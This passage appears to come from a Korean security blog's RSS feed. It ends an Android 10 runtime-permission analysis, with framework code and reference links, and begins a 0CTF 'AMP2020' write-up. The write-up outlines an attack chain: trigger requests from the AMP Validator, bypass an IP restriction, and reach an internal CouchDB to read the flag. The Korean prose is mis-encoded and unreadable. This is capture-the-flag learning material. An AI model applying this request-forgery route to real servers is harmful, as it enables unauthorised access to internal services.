      &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_arg1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;_arg1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
      &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_arg2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;_arg2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readInt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;grantRuntimePermission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_arg0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_arg1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_arg2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;reply&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;writeNoException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;TRANSACTION_revokeRuntimePermission:&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;enforceInterface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;descriptor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_arg0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;_arg0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_arg1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;_arg1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
      &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_arg2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;_arg2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readInt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;revokeRuntimePermission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_arg0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_arg1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_arg2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;reply&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;writeNoException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Parcelì„ ì—­ì§ë ¬í™”í•œ ì´í›„ this.grantRuntimePermissionì˜ ì¸ìê°’ìœ¼ë¡œ ì‚¬ìš©í•©ë‹ˆë‹¤. í•´ë‹¹ í•¨ìˆ˜ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;PackageManagerService.grantRuntimePermission&lt;/code&gt; ì´ë©° ì•„ë˜ì™€ ê°™ì€ ì½”ë“œë¡œ êµ¬ì„±ë˜ì–´ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;grantRuntimePermission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packageName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;permName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;overridePolicy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;checkUidPermission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;Manifest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;permission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ADJUST_RUNTIME_PERMISSIONS_POLICY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Binder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getCallingUid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;PackageManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;PERMISSION_GRANTED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;mPermissionManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;grantRuntimePermission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;permName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packageName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;overridePolicy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;getCallingUid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mPermissionCallback&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë¨¼ì € ìš”ì²­í•œ Packageì˜ uidë¥¼ êµ¬í•œ ì´í›„, í¼ë¯¸ì…˜ ì •ì±…ì„ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ”ì§€ì— ëŒ€í•´ì„œ ê²€ì¦ì„ ì§„í–‰í•©ë‹ˆë‹¤. ì´í›„ì— ì•„ë˜ì™€ ê°™ì´ &lt;code class=&quot;highlighter-rouge&quot;&gt;mPermissionManager.grantRuntimePermission&lt;/code&gt; í•¨ìˆ˜ë¥¼ í†µí•´ í¼ë¯¸ì…˜ì„ ìŠ¹ì¸í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// mPermissionManager.grantRuntimePermission&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;permissionsState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;grantRuntimePermission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;PERMISSION_OPERATION_FAILURE:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;PermissionsState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;PERMISSION_OPERATION_SUCCESS_GIDS_CHANGED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;callback&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;onGidsChanged&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;UserHandle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAppId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;applicationInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;#0 permission request flow&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://source.android.com/devices/tech/config&quot;&gt;https://source.android.com/devices/tech/config&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;#1 ActivityCompat.requestPermissions&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://android.googlesource.com/platform/frameworks/support/+/4f9d8c4/v4/java/android/support/v4/app/ActivityCompat.java#308&quot;&gt;https://android.googlesource.com/platform/frameworks/support/+/4f9d8c4/v4/java/android/support/v4/app/ActivityCompat.java#308&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;#2 ActivityCompatApi23.requestPermissions&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://chromium.googlesource.com/android_tools/+/refs/heads/master/sdk/sources/android-25/android/support/v4/app/ActivityCompatApi23.java#39&quot;&gt;https://chromium.googlesource.com/android_tools/+/refs/heads/master/sdk/sources/android-25/android/support/v4/app/ActivityCompatApi23.java#39&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;#3 Activity.requestPermissions&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://android.googlesource.com/platform/frameworks/base/+/master/core/java/android/app/Activity.java#5094&quot;&gt;https://android.googlesource.com/platform/frameworks/base/+/master/core/java/android/app/Activity.java#5094&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;#4 PermissionController AndroidManifest.xml&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://android.googlesource.com/platform/packages/apps/PackageInstaller/+/refs/heads/master/AndroidManifest.xml#82&quot;&gt;https://android.googlesource.com/platform/packages/apps/PackageInstaller/+/refs/heads/master/AndroidManifest.xml#82&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;#5 GrantPermissionActivity.onCreate&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://android.googlesource.com/platform/packages/apps/PackageInstaller/+/refs/heads/master/src/com/android/packageinstaller/permission/ui/GrantPermissionsActivity.java#304&quot;&gt;https://android.googlesource.com/platform/packages/apps/PackageInstaller/+/refs/heads/master/src/com/android/packageinstaller/permission/ui/GrantPermissionsActivity.java#304&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;#6 GrantPermissionActivity.onPermissionGrantResult&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://android.googlesource.com/platform/packages/apps/PackageInstaller/+/refs/heads/master/src/com/android/packageinstaller/permission/ui/GrantPermissionsActivity.java#726&quot;&gt;https://android.googlesource.com/platform/packages/apps/PackageInstaller/+/refs/heads/master/src/com/android/packageinstaller/permission/ui/GrantPermissionsActivity.java#726&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;#7 GrantPermissionActivity.onPermissionGrantResultSingleState&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://android.googlesource.com/platform/packages/apps/PackageInstaller/+/refs/heads/master/src/com/android/packageinstaller/permission/ui/GrantPermissionsActivity.java#810&quot;&gt;https://android.googlesource.com/platform/packages/apps/PackageInstaller/+/refs/heads/master/src/com/android/packageinstaller/permission/ui/GrantPermissionsActivity.java#810&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;#8 persistChanges&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://cs.android.com/android/platform/superproject/+/master:packages/apps/PermissionController/src/com/android/packageinstaller/permission/model/AppPermissionGroup.java;l=1221?q=persistChanges%20&amp;amp;ss=android%2Fplatform%2Fsuperproject&quot;&gt;https://cs.android.com/android/platform/superproject/+/master:packages/apps/PermissionController/src/com/android/packageinstaller/permission/model/AppPermissionGroup.java;l=1221?q=persistChanges &amp;amp;ss=android%2Fplatform%2Fsuperproject&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;#9 &lt;strong&gt;ApplicationPackageMangaer.grantRuntimePermission&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://cs.android.com/android/platform/superproject/+/master:out/soong/.intermediates/frameworks/base/framework-minus-apex/android_common/xref28/srcjars.xref/frameworks/base/core/java/android/content/pm/IPackageManager.java;drc=master;bpv=1;bpt=1;l=5500&quot;&gt;https://cs.android.com/android/platform/superproject/+/master:out/soong/.intermediates/frameworks/base/framework-minus-apex/android_common/xref28/srcjars.xref/frameworks/base/core/java/android/content/pm/IPackageManager.java;drc=master;bpv=1;bpt=1;l=5500&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;#10 (PackageManagerService extends IPackageManager.Stub).onTransact&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://cs.android.com/android/platform/superproject/+/master:frameworks/base/services/core/java/com/android/server/pm/PackageManagerService.java;l=3937?q=extends%20IPackageManager.Stub&amp;amp;ss=android%2Fplatform%2Fsuperproject&quot;&gt;https://cs.android.com/android/platform/superproject/+/master:frameworks/base/services/core/java/com/android/server/pm/PackageManagerService.java;l=3937?q=extends IPackageManager.Stub&amp;amp;ss=android%2Fplatform%2Fsuperproject&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;#11 IPackageManager.Stub&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://cs.android.com/android/platform/superproject/+/master:out/soong/.intermediates/frameworks/base/framework-minus-apex/android_common/xref28/srcjars.xref/frameworks/base/core/java/android/content/pm/IPackageManager.java;l=5500;drc=master;bpv=1;bpt=1&quot;&gt;https://cs.android.com/android/platform/superproject/+/master:out/soong/.intermediates/frameworks/base/framework-minus-apex/android_common/xref28/srcjars.xref/frameworks/base/core/java/android/content/pm/IPackageManager.java;l=5500;drc=master;bpv=1;bpt=1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;#12 PackageManagerService.grantRuntimePermission&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://cs.android.com/android/platform/superproject/+/master:frameworks/base/services/core/java/com/android/server/pm/PackageManagerService.java;l=5655;drc=master;bpv=1;bpt=1&quot;&gt;https://cs.android.com/android/platform/superproject/+/master:frameworks/base/services/core/java/com/android/server/pm/PackageManagerService.java;l=5655;drc=master;bpv=1;bpt=1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;#13 mPermissionManager.grantRuntimePermission&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://cs.android.com/android/platform/superproject/+/master:frameworks/base/services/core/java/com/android/server/pm/permission/PermissionManagerService.java;l=2187;drc=master;bpv=1;bpt=1?q=PermissionManagerServiceInternal%20&amp;amp;ss=android%2Fplatform%2Fsuperproject&quot;&gt;https://cs.android.com/android/platform/superproject/+/master:frameworks/base/services/core/java/com/android/server/pm/permission/PermissionManagerService.java;l=2187;drc=master;bpv=1;bpt=1?q=PermissionManagerServiceInternal &amp;amp;ss=android%2Fplatform%2Fsuperproject&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Mon, 01 Jun 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-06-01/Android-10-Permissions0</link>
        <guid isPermaLink="true">http://localhost:4000/2020-06-01/Android-10-Permissions0</guid>
        
        <category>android</category>
        
        <category>mobile</category>
        
        <category>analysis</category>
        
        
      </item>
    
      <item>
        <title>AMP2020 writeup</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ê°•ì¸ìš±&lt;/p&gt;

&lt;p&gt;0CTFì—ì„œ ë‚˜ì˜¨ ë¬¸ì œì¤‘ í•˜ë‚˜ë¡œ AMP(Accelerated Mobile Pages)ë¥¼ ì‚¬ìš©í•˜ëŠ” ë¬¸ì œì´ë‹¤. AMP ëŠ” ë¹ ë¥¸ ëª¨ë°”ì¼ í˜ì´ì§€ë¥¼ ìœ„í•´ êµ¬ê¸€ì—ì„œ ë§Œë“  í¬ë§·ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ë˜ì„œ ëª‡ê°€ì§€ ì œì•½ì‚¬í•­ì´ ìˆë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;CSSëŠ” ëª¨ë‘ ì¸ë¼ì¸ìœ¼ë¡œ ì§€ì •í•´ì•¼ í•˜ë©° 50KBë¥¼ ë„˜ì„ ìˆ˜ ì—†ë‹¤.&lt;/li&gt;
  &lt;li&gt;ìŠ¤í¬ë¦½íŠ¸ëŠ” &lt;script async=&quot;&quot; src=&quot;[https://cdn.ampproject.org/v0.js](https://cdn.ampproject.org/v0.js)&quot;&gt;&lt;/script&gt; ë§Œ ì‚¬ìš©í•´ì•¼ í•˜ë©°, ì¶”ê°€ì ì¸ amp íƒœê·¸ë¥¼ ì‚¬ìš©í•˜ë ¤ë©´ ampì—ì„œ ì œê³µí•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì¶”ê°€í•˜ë©´ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;
  &lt;li&gt;ê¸°ë³¸ HTML íƒœê·¸ ëŒ€ì‹  &lt;amp-img&gt;, &lt;amp-anim&gt;, &lt;amp-video&gt;ê°™ì€ AMP ì „ìš© íƒœê·¸ë¥¼ ì‚¬ìš©í•œë‹¤.&lt;/amp-video&gt;&lt;/amp-anim&gt;&lt;/amp-img&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;í”Œë˜ê·¸ë¥¼ ì–»ê¸° ìœ„í•´ì„  ë‹¤ìŒê³¼ ê°™ì€ ë£¨íŠ¸ë¥¼ íƒ€ì•¼í•œë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;AMP Validatorì—ì„œ HTTP Requestë¥¼ ë°œìƒì‹œí‚¨ë‹¤.&lt;/li&gt;
  &lt;li&gt;IPì œí•œì„ ìš°íšŒí•˜ê³  HTTP Requestë¥¼ ë°œìƒì‹œì¼œì„œ ë‚´ë¶€ CouchDB Web APIì— ì ‘ì†í•  ìˆ˜ ìˆë„ë¡ í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;CouchDBì—ì„œ í”Œë˜ê·¸ë¥¼ ê°€ì ¸ì˜¨ë‹¤.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;AMP ê´€ë ¨ ë¬¸ì„œ : &lt;a href=&quot;https://amp.dev/&quot;&gt;https://amp.dev/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ìœ„ ë§í¬ì—ì„œ ì„¤ëª…í•˜ê¸°ë¥¼ ì¶”ê°€ì ì¸ AMP íƒœê·¸ë¥¼ ì‚¬ìš©í•˜ë ¤ë©´ ì•„ë˜ì™€ ê°™ì´ custom-element ë¥¼ ì¶”ê°€í•´ì£¼ê³  ê´€ë ¨ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì¶”ê°€í•´ì¤˜ì•¼ í•œë‹¤ê³  ë‚˜ì™€ìˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;custom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;element&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;amp-ad&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https://cdn.ampproject.org/v0/amp-ad-0.1.js&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
